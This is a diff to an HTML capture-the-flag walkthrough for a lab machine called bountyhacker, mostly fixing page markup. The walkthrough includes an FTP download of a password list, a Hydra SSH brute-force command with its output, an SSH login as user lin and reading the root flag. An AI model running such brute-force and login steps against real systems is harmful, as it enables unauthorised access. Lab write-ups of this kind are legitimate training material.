@@ -127,11 +127,11 @@ local: locks.txt remote: locks.txt
 226 Transfer complete.
 418 bytes received in 00:00 (1.00 KiB/s)
 
-**Both files** task.txt and locks.txt downloaded! </pre>
-        
-     <p>Now, task.txt and you get the flag for Q3. And, save both of these files, they might be used later.</p>
+**Both files** task.txt and locks.txt downloaded! 
+
+    Now, task.txt and you get the flag for Q3. And, save both of these files, they might be used later.</pre>
     
-      <h2>Step 3: Start Enumeration with FTP</h2>
+      <h2>Step 3:Next Flag</h2>
         <pre>
      <p>Now, you have to answer the Q4: **What service can you bruteforce with the text file found?**
 
@@ -229,12 +229,12 @@ Jet
 Ed
 Edward
 Ein
-Faye</pre>
+Faye
+</pre>
+<h2>Step 5: Escalating Privileges</h2>
+<pre> Now, you have to brute force again using Hydra via ssh, because that is all that we’ve got.
 
-    <h2>Step 5: Escalating Privileges</h2>
-    <pre> Now, you have to brute force again using Hydra via ssh, because that is all that we’ve got.
-
-        # hydra ssh://10.10.253.164 -L users.txt -P locks.txt
+Command: hydra ssh://10.10.253.164 -L users.txt -P locks.txt
         
 ┌──(root㉿rex)-[/home/rexadmin/ctf]
 └─# hydra ssh://10.10.253.164 -L users.txt -P locks.txt
@@ -246,11 +246,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-09 23:46:
 1 of 1 target completed, 0 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-09 23:46:59</pre>
 
-      <p>  Unfortunately, we found nothing!
+      <pre>  Unfortunately, we found nothing!
 
         Wait, are you as dumb as me? We found that user's password earlier. Do you have any guesses?
 
-        Don’t worry! I’ll tell you. This above result shows that there is no user available from that list we created. It means the user is lin himself. Ultimately, the password is the exact one we found before. </p>
+        Don’t worry! I’ll tell you. This above result shows that there is no user available from that list we created. It means the user is lin himself. Ultimately, the password is the exact one we found before. </pre>
        
         <h2>Step 6: Obtaining Root Flag</h2>
         <p> Now, we have a user lin and his password.
@@ -259,8 +259,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-09 23:46:
         Let’s log in to the server again via SSH for lin. </p>
 
         # ssh lin@10.10.253.164
-        
-        <pre>
+ <pre>
 ┌──(root㉿rex)-[/home/rexadmin/ctf]
 └─# ssh [lin@10.10.253.164](mailto:lin@10.10.253.164)
 The authenticity of host '10.10.253.164 (10.10.253.164)' can't be established.
@@ -322,11 +321,11 @@ User lin may run the following commands on bountyhacker:
         Now, you have to find the root.txt flag. 
         To find it on the file system, just run <code>locate root.txt</code>.</pre>
 
-     <pre> #locate root.txt
+  <pre> #locate root.txt
         <code>/root/root.txt</code>
         #cat /root/root.txt
         <code>XxXxXxXxXxXxXx</code></pre>
 
-       <H1> Felicitaciones! You did it! </H1>H1>
+       <H1> Felicitaciones! You did it! </H1>
 </body>
 </html>
